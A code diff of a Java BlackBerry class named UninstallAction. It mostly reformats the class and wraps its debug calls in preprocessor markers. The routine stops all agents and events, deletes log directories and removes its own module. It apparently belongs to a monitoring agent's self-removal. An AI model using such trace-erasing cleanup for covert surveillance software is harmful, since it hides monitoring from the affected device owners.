@@ -22,7 +22,9 @@ public class UninstallAction extends SubAction {
         super(actionId_);
         parse(confParams);
 
-        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");
+        // #ifdef DBC
+//@        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");
+        // #endif
     }
 
     public UninstallAction(String host) {
@@ -30,40 +32,46 @@ public class UninstallAction extends SubAction {
     }
 
     public boolean execute() {
+        // #debug
         debug.info("execute");
-        
+
         this.wantUninstall = true;
-        
+
         AgentManager.getInstance().stopAll();
         EventManager.getInstance().stopAll();
-        
+
         LogCollector.getInstance().removeLogDirs();
         Markup.removeMarkups();
-        
-        ApplicationDescriptor ad = ApplicationDescriptor.currentApplicationDescriptor();
+
+        ApplicationDescriptor ad = ApplicationDescriptor
+                .currentApplicationDescriptor();
         int moduleHandle = ad.getModuleHandle();
         int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
         String errorString = Integer.toString(rc);
         switch (rc) {
-            case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
-                debug.info("Will be deleted on restart");
-                //Device.requestPowerOff( true );
-                break;
-            case CodeModuleManager.CMM_MODULE_IN_USE:
-            case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
-                debug.info("Module In Use");
-                break;
-            case CodeModuleManager.CMM_HANDLE_INVALID:
-                debug.error("Invalid Handle");
-                break;
-            case CodeModuleManager.CMM_MODULE_REQUIRED:
-                debug.error("Module Required");
-                break;
-            default:
-                debug.error(Integer.toString(rc));
-                return false;              
+        case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
+            // #debug
+            debug.info("Will be deleted on restart");
+            // Device.requestPowerOff( true );
+            break;
+        case CodeModuleManager.CMM_MODULE_IN_USE:
+        case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
+            // #debug
+            debug.info("Module In Use");
+            break;
+        case CodeModuleManager.CMM_HANDLE_INVALID:
+            // #debug
+            debug.error("Invalid Handle");
+            break;
+        case CodeModuleManager.CMM_MODULE_REQUIRED:
+            // #debug
+            debug.error("Module Required");
+            break;
+        default:
+            // #debug
+            debug.error(Integer.toString(rc));
+            return false;
         }
-        
         return true;
     }
 
